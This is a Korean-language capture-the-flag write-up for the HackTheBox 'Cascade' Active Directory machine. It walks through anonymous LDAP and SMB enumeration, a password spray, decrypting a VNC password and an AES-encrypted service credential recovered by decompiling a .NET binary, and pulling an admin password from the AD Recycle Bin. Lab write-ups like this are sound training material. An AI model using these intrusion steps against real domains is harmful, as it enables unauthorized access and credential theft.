# HTB-CASCADE
```bash
OS: Windows(AD)
DATE: 26.10.12
DIFFICULTY: Medium
```

## RECON
**nmap**: 초기 정찰을 위해 전체 포트 검사 및 상세 포트 검사를 진행하였다
```bash
nmap -p- -T4 IP
```
```bash
nmap -sC -sV IP
```
포트 검사 결과 88, 389, 53 등등이 있는 것으로 보아 AD DC 서버인 것 같았다. 따라서 초기 접근을 위해 nxc를 사용하여 smb 열거를 하였다
```bash
nxc IP smb -u '' -p ''
```
이로써 `cascade.local`라는 도메인을 알게 되었고, 대상 도메인을 추가하여 접근할 수 있게 만들어주었다
```bash
sudo nano /etc/hosts
```
이후 익명의 계정, 즉 Guest 계정으로 접근이 가능한지 확인해보았지만 smb 내용을 볼 수 없었다. 이후 Guest 계정으로 유저 목록을 볼 수 있는 --users를 시도한 결과 성공하였다
```bash
nxc smb cascade.local -u '' -p '' --users

SMB         10.129.82.141   445    CASC-DC1         -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         10.129.82.141   445    CASC-DC1         CascGuest                     <never>             0       Built-in account for guest access to the computer/domain 
SMB         10.129.82.141   445    CASC-DC1         arksvc                        2020-01-09 16:18:20 0  
''''
```
따라서 유저명만 뽑아내는 옵션을 사용하여 유저명만 담아주었다
```bash 
nxc smb cascade.local -u '' -p '' --users |  awk '$5 !~ /^\[/ && $5 != "-Username-" {print $5}' | tee users
```
이후 userlist를 얻었기에 AS-REP Roasting, Kerberoasting 등등을 시도하였지만 모두 실패하였다. 하지만 null 계정, 즉 익명 유저로 하나의 recon을 더 할 수 있었다. `LDAP Anonymous bind`, 아무것도 안 넣고 익명으로 볼 수 있는 것이었다. 방법은 원래 인증하는 `-D, -w`를 빼서 사용하면 익명 bind가 된다
```bash
ldapsearch -x -H ldap://IP -b "DC=cascade,DC=local" "(objectClass=user)"
```
이후 이것을 텍스트 형태로 빼서 검색 필터로 `pwd, password` 등을 검색하면서 찾았다. 검색 결과 알 수 없는 패스워드가 나왔다
```js
lastLogonTimestamp: 134363256824611646
msDS-SupportedEncryptionTypes: 0
cascadeLegacyPwd: clk0bjVldmE=
```
얻은 패스워드는 base64로 인코딩되어 있기에 디코딩해주었다
```bash
echo "clk0bjVldmE=" | base64 -d

rY4n5eva
```
따라서 얻은 패스워드를 nxc를 사용하여 아까 얻은 userlist와 함께 password spray를 시도하였다
```bash
nxc smb IP -u users -p rY4n5eva 

SMB         10.129.82.141   445    CASC-DC1         [+] cascade.local\r.thompson:rY4n5eva 
```
그 결과 `r.thompson`이라는 유저의 크레덴셜을 얻을 수 있었다. 

## Initial Access
첫 유저 크레덴셜을 얻은 후 권한 상승 경로를 찾아보았다. 먼저 r.thompson 유저 계정으로 smb에 접근하였다
```bash
smbclient -L //cascade.local -U r.thompson
```
share 공유 폴더를 확인해보니 `/data/IT` 폴더에 접근할 수 있었다. 따라서 `recurse on`으로 세팅해준 후 ls를 했다. 이로써 폴더들 내용을 재귀적으로 탐색할 수 있었다
```bash
smb: \IT\> recurse on
smb: \IT\> ls

\IT\Email Archives\Meeting_Notes_June_2018.html,\IT\Logs\Ark AD Recycle Bin\ArkAdRecycleBin.log,\IT\Logs\DCs\dcdiag.log,\IT\Temp\s.smith\VNC Install.reg
```
위와 같이 여러 가지 파일을 얻을 수 있었다. 그중 s.smith라는 유저 폴더 안에서 **VNC Install.reg** 안을 살펴보았다. 안에는
```reg
[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC\Server]
"ExtraPorts"=""
"QueryTimeout"=dword:0000001e
"QueryAcceptOnTimeout"=dword:00000000
"LocalInputPriorityTimeout"=dword:00000003
"LocalInputPriority"=dword:00000000
"BlockRemoteInput"=dword:00000000
"BlockLocalInput"=dword:00000000
"IpAccessControl"=""
"RfbPort"=dword:0000170c
"HttpPort"=dword:000016a8
"DisconnectAction"=dword:00000000
"AcceptRfbConnections"=dword:00000001
"UseVncAuthentication"=dword:00000001
"UseControlAuthentication"=dword:00000000
"RepeatControlAuthentication"=dword:00000000
"LoopbackOnly"=dword:00000000
"AcceptHttpConnections"=dword:00000001
"LogLevel"=dword:00000000
"EnableFileTransfers"=dword:00000001
"RemoveWallpaper"=dword:00000001
"UseD3D"=dword:00000001
"UseMirrorDriver"=dword:00000001
"EnableUrlParams"=dword:00000001
"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
"AlwaysShared"=dword:00000000
"NeverShared"=dword:00000000
"DisconnectClients"=dword:00000001
"PollingInterval"=dword:000003e8
"AllowLoopback"=dword:00000000
"VideoRecognitionInterval"=dword:00000bb8
"GrabTransparentWindows"=dword:00000001
"SaveLogToAllUsersPath"=dword:00000000
"RunControlInterface"=dword:00000001
"IdleTimeout"=dword:00000000
"VideoClasses"=""
"VideoRects"=""
```
이와 같은 결과들이 있었다. 여기서 Password 항목 부분에 hex로 암호화되어 보이는 패스워드가 있었다. 따라서 이것을 크랙하기 위해 이것이 어떤 프로그램 패스워드인지 확인 후 크랙 tool을 찾아보았다. 먼저 파일명이 VNC인 것으로 보아 VNC 비번 복호화를 찾아보았다. 찾아본 결과 온라인으로 크랙 도구가 있었다. [VNC_CRACKER](https://keydecryptor.com/decryption-tools/vnc) 이 온라인 서비스를 이용하여 s.smith의 크레덴셜을 얻을 수 있었다

![vnc](attach_real/Pasted%20image%2020261013144230.png)

따라서 먼저 nxc로 정말 맞는 크레덴셜인지 확인 후 winrm으로 접속하였다
```bash
nxc winrm cascade.local -u s.smith -p sT333ve2

PWN!
```
```bash
evil-winrm -i IP -u s.smith -p sT333ve2
```
따라서 유저 쉘을 얻게 되었다

![s.smith](attach_real/Pasted%20image%2020261013101510.png)

## Privilege Escalation
이후 다시 권한이 높은 쉘로 가기 위해 계속해서 RECON하였다. 하지만 다른 취약점을 발견하지 못하였다.
따라서 다시 열거를 진행하였다. 이번에는 smith 계정으로 smb를 다시 한 번 더 접속하였다. smith 계정으로 **Audit$**라는 폴더가 READ 권한이라 확인하였다
```bash
smbclient //cascade.local/Audit$ -U s.smith

smb: \> ls
  .                                   D        0  Thu Jan 30 03:01:26 2020
  ..                                  D        0  Thu Jan 30 03:01:26 2020
  CascAudit.exe                      An    13312  Wed Jan 29 06:46:51 2020
  CascCrypto.dll                     An    12288  Thu Jan 30 03:00:20 2020
  DB                                  D        0  Wed Jan 29 06:40:59 2020
  RunAudit.bat                        A       45  Wed Jan 29 08:29:47 2020
  System.Data.SQLite.dll              A   363520  Sun Oct 27 15:38:36 2019
  System.Data.SQLite.EF6.dll          A   186880  Sun Oct 27 15:38:38 2019
  x64                                 D        0  Mon Jan 27 07:25:27 2020
  x86                                 D        0  Mon Jan 27 07:25:27 2020
```
확인 결과 DB가 있어 추출하여 sqlite라는 것을 알게 되었고, sqlite3을 이용하여 TABLE 등 DB 내용을 털었다
```bash
sqlite3 DB

sqlite> .tables
Ldap
sqlite> SELECT * FROM Ldap;
ArkSvc BQO5l5Kj9MdErXx6Q6AGOw==
```
ArkSvc의 값이 base64로 보여 디코딩을 하였지만 알 수 없는 바이너리가 나와, 대상은 base64 기준 암호화가 된 패스워드로 보였다. 하지만 암호화를 풀려면 키가 있어야 하기에 다시 열거를 하였다. 이번에는 같은 smb에 있던 파일들을 확인하니 **CascCrypto.dll**가 눈에 띄었다. 대상 암호를 푸는 프로그램인 것 같아 리버싱을 진행하였다
```bash
ilspycmd CascCrypto.dll > CascCrypto.cs
``` 
dll을 먼저 리버싱해주어 C# 소스코드로 만들어준 후 소스코드를 뒤져보았다
```cs
namespace CascCrypto
{
	public class Crypto
	{
		public const string DefaultIV = "1tdyjCbY1Ix49842";

		public const int Keysize = 128;

		public static string EncryptString(string Plaintext, string Key)
		{
			byte[] bytes = Encoding.UTF8.GetBytes(Plaintext);
			Aes aes = Aes.Create();
			aes.BlockSize = 128;
			aes.KeySize = 128;
			aes.IV = Encoding.UTF8.GetBytes("1tdyjCbY1Ix49842");
			aes.Key = Encoding.UTF8.GetBytes(Key);
			aes.Mode = CipherMode.CBC;
			using MemoryStream memoryStream = new MemoryStream();
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(bytes, 0, bytes.Length);
				cryptoStream.FlushFinalBlock();
			}
			return Convert.ToBase64String(memoryStream.ToArray());
		}

		public static string DecryptString(string EncryptedString, string Key)
		{
			//Discarded unreachable code: IL_009e
			byte[] array = Convert.FromBase64String(EncryptedString);
			Aes aes = Aes.Create();
			aes.KeySize = 128;
			aes.BlockSize = 128;
			aes.IV = Encoding.UTF8.GetBytes("1tdyjCbY1Ix49842");
			aes.Mode = CipherMode.CBC;
			aes.Key = Encoding.UTF8.GetBytes(Key);
			using MemoryStream stream = new MemoryStream(array);
			using CryptoStream cryptoStream = new CryptoStream(stream, aes.CreateDecryptor(), CryptoStreamMode.Read);
			byte[] array2 = new byte[checked(array.Length - 1 + 1)];
			cryptoStream.Read(array2, 0, array2.Length);
			return Encoding.UTF8.GetString(array2);
		}
	}
}
```
확인 결과 알고리즘 AES 암호화에 필요한 정보들이 담겨 있었다. 먼저 CBC 모드인 것을 알게 되었고 IV도 알게 되었다. 인코딩도 알게 되었다. 하지만 key는 발견하지 못하였다. 따라서 다른 파일을 리버싱해주었다
```bash
ilspycmd CascAudit.exe > CascAudit.cs
```
```bash
{
							val3.Read();
							text = Conversions.ToString(val3["Uname"]);
							text2 = Conversions.ToString(val3["Domain"]);
							string encryptedString = Conversions.ToString(val3["Pwd"]);
							try
							{
								password = Crypto.DecryptString(encryptedString, "c4scadek3y654321");
							}
							catch (Exception ex)
							{
								ProjectData.SetProjectError(ex);
								Exception ex2 = ex;
								Console.WriteLine("Error decrypting password: " + ex2.Message);
								ProjectData.ClearProjectError();
								return;
							}
						}
```
이로써 키 값도 얻게 되었다. 따라서 cyberchef를 사용하여 복호화를 진행하였다

![cybercef](attach_real/Pasted%20image%2020261013153327.png)

따라서 **ArkSvc** 유저의 크레덴셜을 얻을 수 있었다
```bash
nxc winrm IP -u ArkSvc -p w3lc0meFr31nd

PWN!
```

![svc](attach_real/Pasted%20image%2020261013153602.png)

이후 쉘을 얻고 admin 권한 상승을 위해 whoami /all을 확인해보았다. 확인 결과 **CASCADE\AD Recycle Bin**이라는 수상한 그룹에 속해 있어 구글에 검색해보았다. 검색 결과 [AD Recycle Bin Group](https://sn0xs-organization.gitbook.io/sn0x-order.org/red-team-notes/windows-privilege-escalation/ad-recycle-bin-group) 관련 기능 Cheat sheet가 있어 확인해보았다. AD Recycle Bin이란 윈도우 휴지통과 비슷하다. 유저, 컴퓨터, 그룹 등을 삭제해도 즉시 완전 삭제되는 게 아니라 일정 기간 보관된다. 이것은 휴지통에 살아 있는 것들을 확인할 수 있는 그룹이기에 휴지통을 확인해보았다
```ps1
Get-ADObject -Filter {Deleted -eq $true -and ObjectClass -eq "user"} -IncludeDeletedObjects

Deleted           : True
DistinguishedName : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
Name              : TempAdmin
                    DEL:f0cc344d-31e0-4866-bceb-a842791ca059
ObjectClass       : user
ObjectGUID        : f0cc344d-31e0-4866-bceb-a842791ca059
```
먼저 삭제된 유저를 확인한 결과 TempAdmin이라는 유저가 있었다. 다음으로 삭제된 내용을 확인하였다
```ps1
Get-ADObject -Filter {Deleted -eq $true -and ObjectClass -eq "user"} -IncludeDeletedObjects -Properties * |
  Select-Object Name, Description, cascadeLegacyPwd, sAMAccountName

Name                                               Description cascadeLegacyPwd     sAMAccountName
----                                               ----------- ----------------     --------------
CASC-WS1...                                                                         CASC-WS1$
TempAdmin...                                                   YmFDVDNyMWFOMDBkbGVz TempAdmin
```
따라서 어떤 패스워드를 얻어 대상 패스워드를 cyberchef에 돌려보니 자동으로 base64가 나왔다. 따라서 디코딩한 결과 admin의 평문 비밀번호를 얻을 수 있었다

![admin](attach_real/Pasted%20image%2020261013123509.png)

## New Inform
- 익명 바인드로 ldap을 볼 수 있다
- 항상 password를 찾을 때 pwd도 검색어로 설정
- grep을 사용하여 RECON할 때 항상 grep -iE 옵션을 사용하자
- 먼저 인코딩인지, 해시 처리된 건지, 암호화가 된 건지 잘 살펴보자
- 항상 파일명을 주의 깊게 보자
- 암호화되어 있는 패스워드는 대상 프로그램이 뭔지 확인 후 툴을 검색
- 문제가 안 풀리면 초기부터 다시 돌아가
- 크레덴셜이 없을 때는 ldapsearch, 크레덴셜이 있으면 ldapdomaindump가 더 편함
- 권한이 바뀌면 보이는 것도 달라진다. 그 전에 봤던 서비스도 달라질 수 있다
- subl이나 이런 곳에서 필터하지 말고 cli grep -iE로 찾자
- 항상 뭐든지 꼼꼼히 살펴봐야 한다. 틀린 그림 찾기
- 인코딩: 데이터 표현 변환, 키 필요 없음 / 암호화: 데이터 기밀 보호, 키 있으면 가능 / 해시: 데이터 무결성 검증, 되돌리기 불가능
- AES 암호화를 복호화하려면 무슨 알고리즘인지, 그리고 모드, 키, IV, 인코딩 형식을 알아야 한다
- dll, exe를 꼭 리버싱을 시도하자
- 한 파일만 리버싱했다고 끝나는 것이 아니라 다른 파일도 꼭 리버싱을 하자
- whoami /all 하고 꼭 그룹까지 모든 권한을 검사하자
- 휴지통 그룹이면 꼭 휴지통 뒤져보자